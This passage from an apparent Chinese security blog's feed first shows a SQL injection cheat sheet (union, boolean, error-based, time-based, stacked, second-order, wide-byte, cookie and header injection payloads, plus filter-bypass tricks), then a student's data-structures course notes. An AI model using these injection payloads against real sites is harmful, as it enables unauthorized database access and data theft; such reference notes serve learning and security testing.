class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>   <span class="comment">/*获取字段*/</span></span><br></pre></td></tr></table></figure><h2 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;--+     /*判断数据名长度*/</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor-和rand"><a href="#1-floor-和rand" class="headerlink" title="1 floor()和rand()"></a>1 floor()和rand()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="number">2</span>,concat(<span class="string">&#x27;:&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;:&#x27;</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a       <span class="comment">/*利用错误信息得到当前数据库名*/</span></span><br></pre></td></tr></table></figure><h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2 extractvalue()"></a>2 extractvalue()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure><h3 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3 updatexml()"></a>3 updatexml()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4 geometrycollection()"></a>4 geometrycollection()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5 multipoint()"></a>5 multipoint()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6 polygon()"></a>6 polygon()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7 multipolygon()"></a>7 multipolygon()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8 linestring()"></a>8 linestring()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9 multilinestring()"></a>9 multilinestring()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="10-exp"><a href="#10-exp" class="headerlink" title="10 exp()"></a>10 exp()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;;select if(sub(user(),1,1)=&#x27;</span>r<span class="string">&#x27;,sleep(3),1)%23</span></span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册 username&#x3D;test’ ，接下来访问 xxx.php?username&#x3D;test’ ，页面返回 id&#x3D;22 ；</p><p>接下来再次发起请求 xxx.php?id&#x3D;22 ，这时候就有可能发生 sql 注入，比如页面会返回 MySQL 的错误。</p><p>访问 xxx.php?id&#x3D;test’ union select 1,user(),3%23 ，获得新的 id&#x3D;40 ，得到 user() 的结果，利用这种注入方式会得到数据库中的值。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ul><li><input checked="" disabled="" type="checkbox"> 查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用 addslashes() 或其过滤函数</li><li><input checked="" disabled="" type="checkbox"> 数据库的编码为 GBK</li></ul><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">-1</span><span class="operator">%</span>DF<span class="string">&#x27; union select 1,user(),3,%23</span></span><br></pre></td></tr></table></figure><p>在上述条件下，单引号<code>&#39;</code>被转义为 <code>%5c</code> ，所以就构成了 <code>%df%5c</code> ，而在GBK编码方式下，<code>%df%5c</code>是一个繁体字“連”，所以单引号成功逃逸。</p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p>当发现在 url 中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在 cookie 中，然后利用常规注入方式在 cookie 中注入测试即可，只是注入的位置在 cookie 中，与 url 中的注入没有区别。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><p>对参数进行 base64 编码，再发送请求。</p><p>说明：id&#x3D;1’，1的base64编码为<code>MSc=</code>，而<code>=</code>的 url 编码为<code>%3d</code>，所以得到以下结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span>MSc<span class="operator">%</span><span class="number">3</span>d</span><br></pre></td></tr></table></figure><h2 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h2><p>XFF(X-Forward-For)，简称XFF头，它代表客户端真实的 ip 地址</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X<span class="operator">-</span>Forward<span class="operator">-</span><span class="keyword">For</span>：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#x27; select 1,2,user()</span></span><br></pre></td></tr></table></figure><h1 id="0x07-SQL注入绕过技术"><a href="#0x07-SQL注入绕过技术" class="headerlink" title="0x07 SQL注入绕过技术"></a>0x07 SQL注入绕过技术</h1><ul><li><p><strong>大小写绕过</strong></p></li><li><p><strong>双写绕过</strong></p></li><li><p><strong>编码绕过</strong>（url全编码、十六进制）</p></li><li><p><strong>内联注释绕过</strong></p></li><li><p><strong>关键字替换</strong></p><ul><li><p><strong>逗号绕过</strong></p><p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p></li><li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p></li><li><p><strong>逻辑符号的替换</strong>（and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!）</p></li><li><p><strong>空格绕过</strong>（用括号，+等绕过）</p></li></ul></li><li><p><strong>等价函数绕过</strong></p><ul><li>hex()、bin()&#x3D;ascii()</li><li>concat_ws()&#x3D;group_concat()</li><li>mid()、substr()&#x3D;substring()</li></ul></li><li><p><strong>http参数污染</strong>（<code>id=1 union select+1,2,3+from+users+where+id=1–</code>变为<code>id=1 union select+1&amp;id=2,3+from+users+where+id=1–</code>）</p></li><li><p><strong>缓冲区溢出绕过</strong> (id&#x3D;1 and (select 1)&#x3D;(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</p></li></ul><blockquote><p>未完待续</p><p>有遇到SQL注入的奇技淫巧随时更新</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构笔记（桂电教材版本）</title>
      <link href="/posts/24342/"/>
      <url>/posts/24342/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>这个课是以前从来没接触过的东西，而且一直学 web，太久没接触 c 语言了，第一节课看到 for 循环甚至有点陌生，学得有点吃力，所以必须整点笔记，记下相关概念、知识点和平时学习过程中的问题和思考，期末复习用</p><p>2022.1.23</p><p>没想到我这笔记还能留到考研用，属于是未雨绸缪了</p></blockquote><h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h1><ul><li>数据结构研究：数据的逻辑结构（数据内部之间的构成方法）、数据的物理储存（数据在内存里面怎么存的）、数据的操作实现（用什么语言写，用什么算法实现）三方面的问题</li></ul><h2 id="抽象数据类型（Abstract-Data-Type，ADT）"><a href="#抽象数据类型（Abstract-Data-Type，ADT）" class="headerlink" title="抽象数据类型（Abstract Data Type，ADT）"></a>抽象数据类型（Abstract Data Type，ADT）</h2><p>一个数学模型以及定义在该模型上的一组操作，强调对数据类型的抽象，不讲究具体实现</p><p>作用：目的在于隐藏运算实现的细节和内部数据结构，同时向用户提供该数据类型的接口</p><h2 id="应用程序编程接口（Application-Program-Interface，API）"><a href="#应用程序编程接口（Application-Program-Interface，API）" class="headerlink" title="应用程序编程接口（Application Program Interface，API）"></a>应用程序编程接口（Application Program Interface，API）</h2><p>把实现和使用分离，把编程模块化，函数封装成的库就是一个典型的API接口，只管用，一般不用管这个库是怎么写的，这也是面向对象编程的一个重要思维</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="行话"><a href="#行话" class="headerlink" title="行话"></a>行话</h3><ul><li>数据：信息的载体，能够被计算机程序处理的一些符号（字符、数字、声音和图像等等）</li><li>数据元素&#x2F;结点：组成数据的基本单位</li><li>数据项：&#x3D;&#x3D;是数据的最小单位&#x3D;&#x3D;，是数据元素的组成单位，比它还小</li><li>数据结构：存在相互关系的数据元素的集合，开发者会根据这种数据结构设计相应的算法，确保运算以后的新结构依旧保持原来的结构类型</li><li>数据对象：是必须由软件理解的复合信息表示，跟上面四个东西没有很强的逻辑关系，数据对象描述包括了其所有的属性，只用来封装数据，不对数据进行操作</li></ul><hr><blockquote><p>整点自己的理解</p></blockquote><p>假如有两张表，一个是课程表，一个是憨憨弱口令表，那么这两张表就是&#x3D;&#x3D;数据&#x3D;&#x3D;</p><table><thead><tr><th>课程代号</th><th>课程名字</th><th>授课老师</th></tr></thead><tbody><tr><td>123456789</td><td>数据结构</td><td>张瑞霞</td></tr><tr><td>987654321</td><td>网络渗透测试</td><td>xx</td></tr><tr><td>135792468</td><td>信息安全数学基础</td><td>xxx</td></tr></tbody></table><table><thead><tr><th>id</th><th>username</th><th>password</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>123456</td></tr><tr><td>2</td><td>root</td><td>root</td></tr><tr><td>3</td><td>admin888</td><td>888888</td></tr></tbody></table><p>每一张表的每一行数据就是&#x3D;&#x3D;数据元素&#x3D;&#x3D;</p><p>每一行里面的列值就是&#x3D;&#x3D;数据项&#x3D;&#x3D;，比如课程名字、password</p><p>几行几列，行的值最大能存储多少字节，能不能为空，列的数据类型是什么，表头是什么，这些是开发设计的&#x3D;&#x3D;数据结构&#x3D;&#x3D;</p><p>单独的一张表就是叫&#x3D;&#x3D;数据对象&#x3D;&#x3D;，比如憨憨弱口令表就是一个数据对象，课程表也是一个数据对象</p><hr><ul><li>前驱：一个结点前面的结点叫前驱</li><li>后继：一个结点后面的结点叫后继</li></ul><blockquote><p>所以很明显开始的结点没有前驱，结束的结点没有后继，我当时听课还想老半天</p></blockquote><h3 id="数据的逻辑结构"><a href="#数据的逻辑结构" class="headerlink" title="数据的逻辑结构"></a>数据的逻辑结构</h3><p>就是数据元素之间的逻辑关系，常见以下四种：</p><ul><li>集合：结点之间没有关系</li><li>线性结构：结点之间一对一联系起来，&#x3D;&#x3D;一根绳上的蚂蚱&#x3D;&#x3D;</li><li>树形结构：结点之间一对多的关系，&#x3D;&#x3D;叫树形结构的原因也是因为和现实生活中的树的树枝很像吧&#x3D;&#x3D;</li><li>图形结构：结点之间多对多的关系</li></ul><h3 id="数据的存储结构"><a href="#数据的存储结构" class="headerlink" title="数据的存储结构"></a>数据的存储结构</h3><ul><li>顺序存储结构：拿计算机里一组连续的存储单元来存放数据，用内存地址来体现逻辑关系，可以理解为逻辑关系和物理位置是一样的，都排好队。对应之后学习的&#x3D;&#x3D;顺序表&#x3D;&#x3D;</li><li>链式存储结构：数据元素存放位置由编译器随机分配，数据元素之间的逻辑关系就不能通过物理位置来体现，需要用指针来把分散的结点串起来。对应之后学习的&#x3D;&#x3D;链表&#x3D;&#x3D;</li><li>索引存储结构：在存储结点的时候同时增加一个索引表，表中的每一项作为索引项，需要包含一个结点的关键码（准确识别）和存储位置</li><li>散列储存结构：将结点的关键字作为散列函数的输入，散列函数输出的是结点的存储位置</li></ul><h3 id="数据的操作"><a href="#数据的操作" class="headerlink" title="数据的操作"></a>数据的操作</h3><p>优秀的算法</p><h2 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h2><ul><li>分时间复杂度和空间复杂度</li></ul><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>算法的基本操作重复执行的次数用<code>T(n)</code>表示，再来一个辅助函数<code>f(n)</code>，当 n 趋于正无穷的时候，<code>T(n)</code>&#x2F;<code>f(n)</code>为一个常数，即辅助函数是执行次数的同数量级函数时，时间复杂度就是<code>O(f(n))</code></p><h3 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h3><ol><li><p>&#x3D;&#x3D;只关注循环执行次数最多的那段代码&#x3D;&#x3D;</p><p>&#x3D;&#x3D;时间复杂度是一种变化的趋势，当 n 趋于无穷大时，通常忽略掉常量、低阶和系数的影响，只记录大的高阶量&#x3D;&#x3D;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f0x</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += i;<span class="comment">//求和</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这段代码我们就只用看 sum+=1 循环了 n 次，所以时间复杂度就是O(n)</span></span><br></pre></td></tr></table></figure></li><li><p>加法法则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f0x</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum_1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum_1 += i;<span class="comment">//求和</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> sum_2 = <span class="number">0</span>;</span><br><span class="line">    i = i ^ i;<span class="comment">//把i置零</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum_2 += i;<span class="comment">//求和</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum_1 + sum_2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无法评估 m 和 n 同时趋于正无穷时哪个大，所以用加法法则 T1(m)+ T2(n) = O(f(m)) + O(f(n))</span></span><br></pre></td></tr></table></figure></li><li><p>乘法法则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f0x</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//计数器</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)<span class="comment">//执行 n+1 次</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n;j++)<span class="comment">//执行 n(n+1) 次</span></span><br><span class="line">            flag++;<span class="comment">//执行 n^2次</span></span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一组嵌套的 for 循环，T(n)=2n^2+2n+1，取同数量级 n^2作为时间复杂度，即O(n^2)</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><ul><li><p>线性级数O(n)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">0</span>;i &lt; n;i++)<span class="comment">// n+1 次</span></span><br><span class="line">    flag++;<span class="comment">//n 次</span></span><br><span class="line"><span class="comment">// T(n)=2n+1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">1</span>;i &lt;= n;i = i * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">1</span>;j &lt;= i;j++)</span><br><span class="line">        flag++;</span><br></pre></td></tr></table></figure><p>第三行的执行次数是一个等比数列的和，等比数列为 1+2+4+2^(log<del>2</del>^n^+1)+… ，利用高等数学的知识可以知道时间复杂度为 O(n)</p></li><li><p>对数级数O(log<del>x</del>^n^)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">1</span>;i &lt;= n;i = i * x)</span><br><span class="line">    flag++;</span><br><span class="line"><span class="comment">// 当 n=1时，循环执行1次,n=x^2时，循环执行2次，n=x^3时，循环执行3次，数学规律为循环执行logxn次</span></span><br><span class="line"><span class="comment">// T(n)=logxn</span></span><br></pre></td></tr></table></figure></li><li><p>平方级数O(n^2^)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">0</span>;i &lt; n;i++)<span class="comment">// n+1 次</span></span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n;j++)<span class="comment">// n 次</span></span><br><span class="line">        flag++;<span class="comment">// n(n+1)次</span></span><br><span class="line"><span class="comment">// T(n)=2n^2+2n+1</span></span><br></pre></td></tr></table></figure></li><li><p>二阶级数O(nlog<del>x</del>^n^)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i =<span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">1</span>;j &lt;= n;j = j * x)</span><br><span class="line">        flag++;</span><br><span class="line"><span class="comment">// 第一行执行 n+1 次，第二行执行 logxn 次，第三行执行 nlogxn 次</span></span><br><span class="line"><span class="comment">// T(n)= n+1+logxn+nlogxn</span></span><br></pre></td></tr></table></figure><ul><li>二阶级数的内外层循环调换顺序结果也是一样</li></ul></li></ul><blockquote><p>第一章结束，概念比较多，时间复杂度比较重要</p><p>去csdn看到的比较好的文章</p><p><a href="https://blog.csdn.net/weixin_39596963/article/details/80987779?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-80987779.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/weixin_39596963/article/details/80987779?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-80987779.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187</a></p><p><a href="https://blog.csdn.net/qq_41523096/article/details/82142747?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-3-82142747.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/qq_41523096/article/details/82142747?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-3-82142747.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187</a></p></blockquote><hr><h1 id="第二章-线性表"><a href="#第二章-线性表" class="headerlink" title="第二章 线性表"></a>第二章 线性表</h1><ul><li>线性表是由 n(n&gt;&#x3D;0) 个性质相同的数据元素组成的&#x3D;&#x3D;有限序列&#x3D;&#x3D;</li><li>同一线性表中的元素类型相同</li><li>主要操作有：创建空线性表、判断线性表是否为空、插入、删除和查找等基本操作</li></ul><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><ul><li>顺序表用一组&#x3D;&#x3D;地址连续的存储单元&#x3D;&#x3D;依次存储线性表中的各元素，通过位置来表示数据元素之间的逻辑关系，数据元素的逻辑关系和物理关系一样</li></ul><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200929162306.png" alt="链表和顺序表"></p><h3 id="顺序表类型定义"><a href="#顺序表类型定义" class="headerlink" title="顺序表类型定义"></a>顺序表类型定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;<span class="comment">//给 int 换名字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">List</span>//定义顺序表类型</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> Max;<span class="comment">//最大元素个数</span></span><br><span class="line">    <span class="type">int</span> n;<span class="comment">//实际元素个数</span></span><br><span class="line">    DataType *elem;<span class="comment">//首地址</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">List</span> *<span class="title">SeqList</span>;</span><span class="comment">//把顺序表类型名字换成 *SeqList</span></span><br></pre></td></tr></table></figure><h3 id="顺序表建立和判空"><a href="#顺序表建立和判空" class="headerlink" title="顺序表建立和判空"></a>顺序表建立和判空</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span 